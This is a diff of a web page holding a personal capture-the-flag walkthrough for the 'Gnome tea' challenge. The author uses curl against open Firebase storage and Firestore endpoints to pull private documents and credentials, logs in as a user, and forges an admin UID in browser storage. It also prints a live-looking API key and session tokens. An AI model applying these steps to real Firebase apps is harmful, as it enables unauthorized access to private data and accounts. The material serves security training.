@@ -11,26 +11,28 @@
       
       
       
+        <link rel="prev" href="../act_2_going_in_reverse/">
       
-        <link rel="next" href="objectives/act_1_its_all_about_defang/">
+      
+        <link rel="next" href="../act_3_hack_a_gnome/">
       
       
         
       
       
-      <link rel="icon" href="img/misc/favicon.ico">
+      <link rel="icon" href="../../img/misc/favicon.ico">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
     
     
       
-        <title>SANS Holidays Hack Challenge 2026 Write-Up</title>
+        <title>Objective 1 - SANS Holidays Hack Challenge 2026 Write-Up</title>
       
     
     
-      <link rel="stylesheet" href="assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -49,9 +51,9 @@
       
     
     
-      <link rel="stylesheet" href="css/extra.css">
+      <link rel="stylesheet" href="../../css/extra.css">
     
-    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -76,7 +78,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#welcome" class="md-skip">
+        <a href="#act-3-gnome-tea" class="md-skip">
           Skip to content
         </a>
       
@@ -92,7 +94,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="." title="SANS Holidays Hack Challenge 2026 Write-Up" class="md-header__button md-logo" aria-label="SANS Holidays Hack Challenge 2026 Write-Up" data-md-component="logo">
+    <a href="../.." title="SANS Holidays Hack Challenge 2026 Write-Up" class="md-header__button md-logo" aria-label="SANS Holidays Hack Challenge 2026 Write-Up" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M224-32c7 0 13.7 3.1 18.3 8.5l136 160c6.1 7.1 7.4 17.1 3.5 25.6S369.4 176 360 176h-24.9l75.2 88.5c6.1 7.1 7.4 17.1 3.5 25.6S401.4 304 392 304h-38.5l88.8 104.5c6.1 7.1 7.4 17.1 3.5 25.6S433.4 448 424 448H256v64c0 17.7-14.3 32-32 32s-32-14.3-32-32v-64H24c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6L94.5 304H56c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6l75.2-88.5H88c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6l136-160C210.3-28.9 217-32 224-32"/></svg>
@@ -112,7 +114,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Welcome
+              Objective 1
             
           </span>
         </div>
@@ -218,7 +220,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="." title="SANS Holidays Hack Challenge 2026 Write-Up" class="md-nav__button md-logo" aria-label="SANS Holidays Hack Challenge 2026 Write-Up" data-md-component="logo">
+    <a href="../.." title="SANS Holidays Hack Challenge 2026 Write-Up" class="md-nav__button md-logo" aria-label="SANS Holidays Hack Challenge 2026 Write-Up" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M224-32c7 0 13.7 3.1 18.3 8.5l136 160c6.1 7.1 7.4 17.1 3.5 25.6S369.4 176 360 176h-24.9l75.2 88.5c6.1 7.1 7.4 17.1 3.5 25.6S401.4 304 392 304h-38.5l88.8 104.5c6.1 7.1 7.4 17.1 3.5 25.6S433.4 448 424 448H256v64c0 17.7-14.3 32-32 32s-32-14.3-32-32v-64H24c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6L94.5 304H56c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6l75.2-88.5H88c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6l136-160C210.3-28.9 217-32 224-32"/></svg>
@@ -233,37 +235,10 @@
       
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Welcome
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="." class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
         
   
   
@@ -279,37 +254,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#introduction" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Introduction
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -318,8 +262,10 @@
       
   
   
+    
   
   
+  
     
     
     
@@ -330,11 +276,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
         
           
           <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
@@ -355,7 +301,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             
@@ -422,7 +368,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_its_all_about_defang/" class="md-nav__link">
+      <a href="../act_1_its_all_about_defang/" class="md-nav__link">
         
   
   
@@ -452,7 +398,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_neighborhood_watch_bypass/" class="md-nav__link">
+      <a href="../act_1_neighborhood_watch_bypass/" class="md-nav__link">
         
   
   
@@ -482,7 +428,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_santa_s_gift_tracking_service_port_mystery/" class="md-nav__link">
+      <a href="../act_1_santa_s_gift_tracking_service_port_mystery/" class="md-nav__link">
         
   
   
@@ -512,7 +458,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_visual_networking_thinger/" class="md-nav__link">
+      <a href="../act_1_visual_networking_thinger/" class="md-nav__link">
         
   
   
@@ -542,7 +488,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_visual_firewall_thinger/" class="md-nav__link">
+      <a href="../act_1_visual_firewall_thinger/" class="md-nav__link">
         
   
   
@@ -572,7 +518,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_intro_to_nmap/" class="md-nav__link">
+      <a href="../act_1_intro_to_nmap/" class="md-nav__link">
         
   
   
@@ -602,7 +548,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_blob_storage_challenge_in_the_neighborhood/" class="md-nav__link">
+      <a href="../act_1_blob_storage_challenge_in_the_neighborhood/" class="md-nav__link">
         
   
   
@@ -632,7 +578,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_spare_key/" class="md-nav__link">
+      <a href="../act_1_spare_key/" class="md-nav__link">
         
   
   
@@ -662,7 +608,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_the_open_door/" class="md-nav__link">
+      <a href="../act_1_the_open_door/" class="md-nav__link">
         
   
   
@@ -692,7 +638,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_owner/" class="md-nav__link">
+      <a href="../act_1_owner/" class="md-nav__link">
         
   
   
@@ -779,7 +725,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_retro_recovery/" class="md-nav__link">
+      <a href="../act_2_retro_recovery/" class="md-nav__link">
         
   
   
@@ -809,7 +755,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_mail_detective/" class="md-nav__link">
+      <a href="../act_2_mail_detective/" class="md-nav__link">
         
   
   
@@ -839,7 +785,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_IDORable_bistro/" class="md-nav__link">
+      <a href="../act_2_IDORable_bistro/" class="md-nav__link">
         
   
   
@@ -869,7 +815,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_dosis_network_down/" class="md-nav__link">
+      <a href="../act_2_dosis_network_down/" class="md-nav__link">
         
   
   
@@ -899,7 +845,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_rogue_gnome_identity_provider/" class="md-nav__link">
+      <a href="../act_2_rogue_gnome_identity_provider/" class="md-nav__link">
         
   
   
@@ -929,7 +875,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_quantgnome_leap/" class="md-nav__link">
+      <a href="../act_2_quantgnome_leap/" class="md-nav__link">
         
   
   
@@ -959,7 +905,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_going_in_reverse/" class="md-nav__link">
+      <a href="../act_2_going_in_reverse/" class="md-nav__link">
         
   
   
@@ -994,6 +940,8 @@
                 
   
   
+    
+  
   
   
     
@@ -1003,11 +951,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
         
           
           <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
@@ -1028,7 +976,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2_3">
             <span class="md-nav__icon md-icon"></span>
             
@@ -1043,10 +991,39 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="objectives/act_3_gnome_tea/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Objective 1
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1064,6 +1041,48 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#objective" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Objective
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Solution
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1076,7 +1095,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_3_hack_a_gnome/" class="md-nav__link">
+      <a href="../act_3_hack_a_gnome/" class="md-nav__link">
         
   
   
@@ -1106,7 +1125,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_3_snowcat_rce_and_priv_esc/" class="md-nav__link">
+      <a href="../act_3_snowcat_rce_and_priv_esc/" class="md-nav__link">
         
   
   
@@ -1136,7 +1155,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_3_schrodingers_scope/" class="md-nav__link">
+      <a href="../act_3_schrodingers_scope/" class="md-nav__link">
         
   
   
@@ -1166,7 +1185,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_3_on_the_wire/" class="md-nav__link">
+      <a href="../act_3_on_the_wire/" class="md-nav__link">
         
   
   
@@ -1221,17 +1240,140 @@
 
 
 
-<h1 id="welcome">Welcome<a class="headerlink" href="#welcome" title="Permanent link">⚓︎</a></h1>
-<p><img alt="Group photo" src="img/misc/holidayhack2025.jpg" /></p>
-<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">⚓︎</a></h2>
-<p>Here is a compilation of the notes made during the SANS Holiday Hack challenge 2025.
-It is more of a step by step process to record my thought process, rather than a complete tutorial/report.</p>
+<h1 id="act-3-gnome-tea">Act 3: Gnome tea<a class="headerlink" href="#act-3-gnome-tea" title="Permanent link">⚓︎</a></h1>
+<p><strong>Difficulty</strong>: <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M309.5-18.9c-4.1-8-12.4-13.1-21.4-13.1s-17.3 5.1-21.4 13.1l-73.6 144.2-159.9 25.4c-8.9 1.4-16.3 7.7-19.1 16.3s-.5 18 5.8 24.4l114.4 114.5-25.2 159.9c-1.4 8.9 2.3 17.9 9.6 23.2s16.9 6.1 25 2l144.4-73.4L432.4 491c8 4.1 17.7 3.3 25-2s11-14.2 9.6-23.2l-25.3-159.9 114.4-114.5c6.4-6.4 8.6-15.8 5.8-24.4s-10.1-14.9-19.1-16.3L383 125.3z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M309.5-18.9c-4.1-8-12.4-13.1-21.4-13.1s-17.3 5.1-21.4 13.1l-73.6 144.2-159.9 25.4c-8.9 1.4-16.3 7.7-19.1 16.3s-.5 18 5.8 24.4l114.4 114.5-25.2 159.9c-1.4 8.9 2.3 17.9 9.6 23.2s16.9 6.1 25 2l144.4-73.4L432.4 491c8 4.1 17.7 3.3 25-2s11-14.2 9.6-23.2l-25.3-159.9 114.4-114.5c6.4-6.4 8.6-15.8 5.8-24.4s-10.1-14.9-19.1-16.3L383 125.3z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M309.5-18.9c-4.1-8-12.4-13.1-21.4-13.1s-17.3 5.1-21.4 13.1l-73.6 144.2-159.9 25.4c-8.9 1.4-16.3 7.7-19.1 16.3s-.5 18 5.8 24.4l114.4 114.5-25.2 159.9c-1.4 8.9 2.3 17.9 9.6 23.2s16.9 6.1 25 2l144.4-73.4L432.4 491c8 4.1 17.7 3.3 25-2s11-14.2 9.6-23.2l-25.3-159.9 114.4-114.5c6.4-6.4 8.6-15.8 5.8-24.4s-10.1-14.9-19.1-16.3L383 125.3z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M288.1-32c9 0 17.3 5.1 21.4 13.1L383 125.3l159.9 25.4c8.9 1.4 16.3 7.7 19.1 16.3s.5 18-5.8 24.4L441.7 305.9 467 465.8c1.4 8.9-2.3 17.9-9.6 23.2s-17 6.1-25 2l-144.3-73.4L143.8 491c-8 4.1-17.7 3.3-25-2s-11-14.2-9.6-23.2l25.2-159.9L20 191.4c-6.4-6.4-8.6-15.8-5.8-24.4s10.1-14.9 19.1-16.3l159.9-25.4 73.6-144.2c4.1-8 12.4-13.1 21.4-13.1zm0 76.8L230.3 158c-3.5 6.8-10 11.6-17.6 12.8l-125.5 20 89.8 89.9c5.4 5.4 7.9 13.1 6.7 20.7l-19.8 125.5 113.3-57.6c6.8-3.5 14.9-3.5 21.8 0l113.3 57.6-19.8-125.5c-1.2-7.6 1.3-15.3 6.7-20.7l89.8-89.9-125.5-20c-7.6-1.2-14.1-6-17.6-12.8z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M288.1-32c9 0 17.3 5.1 21.4 13.1L383 125.3l159.9 25.4c8.9 1.4 16.3 7.7 19.1 16.3s.5 18-5.8 24.4L441.7 305.9 467 465.8c1.4 8.9-2.3 17.9-9.6 23.2s-17 6.1-25 2l-144.3-73.4L143.8 491c-8 4.1-17.7 3.3-25-2s-11-14.2-9.6-23.2l25.2-159.9L20 191.4c-6.4-6.4-8.6-15.8-5.8-24.4s10.1-14.9 19.1-16.3l159.9-25.4 73.6-144.2c4.1-8 12.4-13.1 21.4-13.1zm0 76.8L230.3 158c-3.5 6.8-10 11.6-17.6 12.8l-125.5 20 89.8 89.9c5.4 5.4 7.9 13.1 6.7 20.7l-19.8 125.5 113.3-57.6c6.8-3.5 14.9-3.5 21.8 0l113.3 57.6-19.8-125.5c-1.2-7.6 1.3-15.3 6.7-20.7l89.8-89.9-125.5-20c-7.6-1.2-14.1-6-17.6-12.8z"/></svg></span><br/>
+<strong>Direct link</strong>: <a href="https://gnometea.web.app/login">Website</a></p>
+<h2 id="objective">Objective<a class="headerlink" href="#objective" title="Permanent link">⚓︎</a></h2>
+<div class="admonition question">
+<p class="admonition-title">Request</p>
+<p>Enter the apartment building near 24-7 and help Thomas infiltrate the GnomeTea social network and discover the secret agent passphrase.</p>
+</div>
+<details class="quote">
+<summary>Thomas Bouve</summary>
+<p>The gnomes have been oddly suspicious and whispering to each other. In fact, I could've sworn I heard them use some sort of secret phrase. When I laughed right next to one, it said "passphrase denied". I asked what that was all about but it just giggled and ran away.<br/>
+I know they've been using GnomeTea to "spill the tea" on one another, but I can't sign up 'cause I'm obviously not a gnome. I could sure use your expertise to infiltrate this app and figure out what their secret passphrase is.<br/>
+I've tried a few things already, but as usual the whole... Uh, what's the word I'm looking for here? Oh right, "endeavor", ended up with the rest of my unfinished projects.</p>
+</details>
+<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
+<p>Triggering an error in the user interface allows to show that the app uses Firebase as a backend</p>
+<p><img alt="Terminal output" src="../../img/objectives/o18/o18_1.png" /></p>
+<ul>
+<li>Let's see the local config of that service
+https://firebase.google.com/docs/web/learn-more?hl=fr#config-object shows the structure of the config file and what to look for in the Javascript</li>
+</ul>
+<p><img alt="Terminal output" src="../../img/objectives/o18/o18_2.png" /></p>
+<ul>
+<li>Looking at the JS with one of the config file terms <code>storageBucket</code>:
+<code>https://gnometea.web.app/assets/index-BVLyJWJ_.js</code></li>
+</ul>
+<p>We see a lot of information related to that app, and specifically the database name:
+<div class="highlight"><pre><span></span><code>{
+    apiKey:&quot;AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk&quot;,
+    authDomain:&quot;holidayhack2025.firebaseapp.com&quot;,
+    projectId:&quot;holidayhack2025&quot;,
+    storageBucket:&quot;holidayhack2025.firebasestorage.app&quot;,
+    messagingSenderId:&quot;341227752777&quot;,
+    appId:&quot;1:341227752777:web:7b9017d3d2d83ccf481e98&quot;
+}
+</code></pre></div></p>
+<ul>
+<li>Let's see if we can access that bucket online<br/>
+<code>curl https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o</code><br/>
+It contains gnomes'profile picture and drivers licenses. We can download and analyze them to get more information
+<img alt="Terminal output" src="../../img/objectives/o18/o18_3.png" /></li>
+</ul>
+<p>All files in the bucket are accessible, except the one at this location: <br/>
+<code>https://storage.googleapis.com/holidayhack2025.firebasestorage.app/gnome-documents/l7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg</code><br/></p>
+<p>Can we use another URL to access it?<br/></p>
+<p><code>curl "https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg?alt=media" -o dl1.jpeg</code><br/></p>
+<p><img alt="Terminal output" src="../../img/objectives/o18/o18_4.png" /></p>
+<p>And yes we can, seems like the file has been donwloaded</p>
+<ul>
+<li>Use an online exif tool analyzer to extract information from the image file
+<img alt="Terminal output" src="../../img/objectives/o18/o18_6.png" /></li>
+</ul>
+<p>The file contains GPS coordinates about where it was taken: <strong>33 deg 27' 53.85" S, 115 deg 54' 37.62" E</strong></p>
+<p>We can put it in Google Maps to see where it leads to.
+<img alt="Terminal output" src="../../img/objectives/o18/o18_7.png" />
+Seems like it links to a town called Gnomesville, quite a cute unusual place!!</p>
+<ul>
+<li>
+<p>Let's explore the address with google maps
+<img alt="Terminal output" src="../../img/objectives/o18/o18_8.png" /></p>
+</li>
+<li>
+<p>Explore the local DB storage for the app
+<img alt="Terminal output" src="../../img/objectives/o18/o18_9.png" /></p>
+</li>
+<li>
+<p>Access the fbase_key file<br/>
+<code>curl https://gnometea.web.app/fbase_key</code></p>
+</li>
+</ul>
+<p><img alt="Terminal output" src="../../img/objectives/o18/o18_10.png" /></p>
+<p>Now we know the name of the collections (important, because firebase does not allow to list collections)</p>
+<ul>
+<li>Try to access the different collections and see if one of the gnomes casually mentions someone password while spilling the tea<ul>
+<li>Reading the <strong>tea</strong> collection<br/>
+<code>curl "https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea"|grep pass</code><br/>
+<img alt="Terminal output" src="../../img/objectives/o18/o18_11.png" /></li>
+</ul>
+</li>
+</ul>
+<p>And yes, they do!
+    - Reading the <strong>dms</strong> collection
+<code>curl "https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms</code><br/></p>
+<ul>
+<li>Let's look for the email address of Barnaby Briefcase to get access to the account<br/>
+<code>curl "https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes"|grep barnab</code><br/>
+<img alt="Terminal output" src="../../img/objectives/o18/o18_12.png" /></li>
+</ul>
+<p>We now have a complete set of credentials to login to the Gnome app:<br/>
+<div class="highlight"><pre><span></span><code>Email: barnabybriefcase@gnomemail.dosis
+Password: &quot;MakeRColdOutside123!&quot;
+</code></pre></div></p>
+<p><img alt="Terminal output" src="../../img/objectives/o18/o18_13.png" /><br/></p>
+<p>It still do not work, maybe it was changed after being divulged on a public forum?<br/></p>
+<p>Let's check the dms from Barnaby</p>
+<p><img alt="Terminal output" src="../../img/objectives/o18/o18_14.png" /></p>
+<p>Ok, so now we understand better, the password is the name of the town with the Gnomes: <strong>gnomesville</strong></p>
+<p>Now we successfully logged into the App</p>
+<p><img alt="Terminal output" src="../../img/objectives/o18/o18_15.png" /></p>
+<ul>
+<li>However, we cannot yet access the admin page </li>
+</ul>
+<p><img alt="Terminal output" src="../../img/objectives/o18/o18_16.png" /></p>
+<ul>
+<li>
+<p>By inspecting the storage of the web app, we notice a key associated with the user<br/>
+<code>firebase:authUser:AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk:[DEFAULT] :"{"fbase_key":"firebase:authUser:AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk:[DEFAULT]","value":{"uid":"l7VS01K9GKV5ir5S8suDcwOFEpp2","email":"barnabybriefcase@gnomemail.dosis","emailVerified":true,"displayName":"Barnaby Briefcase","isAnonymous":false,"providerData":[{"providerId":"password","uid":"barnabybriefcase@gnomemail.dosis","displayName":"Barnaby Briefcase","email":"barnabybriefcase@gnomemail.dosis","phoneNumber":null,"photoURL":null}],"stsTokenManager":{"refreshToken":"AMf-vByq4902_YbTlqMlR1bveDQPp3RxD6UIvQkVuJIO7-wpydiarQo3neDHFOCLgZwNRjw5YJcqXq6Gut3NrE2tJKvX5MJOzb0Tux0-cdJV2dT5sX2_7oUh3oDCVv1P1CB_idoKROsKlzV6pF_7Bloc_8lVMao3B-UxdlY9JFLHfAlIAYjCtEztnavrgG_23C1x9ZPFubm9PBNNm_DrsrBX0wtCs5euGQAKMQzK9p00Y_14g7kaBoAaUl1yC-HUFEGEKGJwDjME","accessToken":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjM4MTFiMDdmMjhiODQxZjRiNDllNDgyNTg1ZmQ2NmQ1NWUzOGRiNWQiLCJ0eXAiOiJKV1QifQ.eyJuYW1lIjoiQmFybmFieSBCcmllZmNhc2UiLCJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vaG9saWRheWhhY2syMDI1IiwiYXVkIjoiaG9saWRheWhhY2syMDI1IiwiYXV0aF90aW1lIjoxNzY1OTQxODM2LCJ1c2VyX2lkIjoibDdWUzAxSzlHS1Y1aXI1UzhzdURjd09GRXBwMiIsInN1YiI6Imw3VlMwMUs5R0tWNWlyNVM4c3VEY3dPRkVwcDIiLCJpYXQiOjE3NjU5NDE4MzYsImV4cCI6MTc2NTk0NTQzNiwiZW1haWwiOiJiYXJuYWJ5YnJpZWZjYXNlQGdub21lbWFpbC5kb3NpcyIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbImJhcm5hYnlicmllZmNhc2VAZ25vbWVtYWlsLmRvc2lzIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.BqZ9Pr9ITyqCB4g2gt5dSkHJa-xD4GrdhV5UdNOBsJKsmxgCikTPXzvhEP4sEmtnZcuaYnCHSC_AxaWdRcGQnvkmntnKjTrru7hGvpwBPtqwedpYg2VnIJY6Nd97hbBBL5FscMzM01wEMZobbXnaoZT-ES1Rbx7FL4F2F4uePcABnRDFfII7HBp-CW36In_N-B_TzoNf1va72RwP12EB1NMUMFu9wlCJ9vZB4lALn9IwVrm7qcUuUiOBjvzOdHadHcr2EZSgq_cU9F0W60FclCB8p8MYw46bJLW18McKA4HES5E3Cqs8hErM0GhqrmxTecx5rCcLEpfKlrl8rgammw","expirationTime":1765945435581},"createdAt":"1759256487470","lastLoginAt":"1765941836122","apiKey":"AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk","appName":"[DEFAULT]"}}"</code><br/></p>
+</li>
+<li>
+<p>Can we access the admin page?<br/></p>
+</li>
+</ul>
+<p><img alt="Terminal output" src="../../img/objectives/o18/o18_17.png" /></p>
+<p><img alt="Terminal output" src="../../img/objectives/o18/o18_18.png" /></p>
+<ul>
+<li>Let's  change the uid of Barnaby to the one of the admin that we found in the javascript<br/>
+<img alt="Terminal output" src="../../img/objectives/o18/o18_19.png" /></li>
+</ul>
+<p>Delete the existing firebase stored data and recreate it by changing the UID to the one of the admin: <strong>3loaihgxP0VwCTKmkHHFLe6FZ4m2</strong><br/></p>
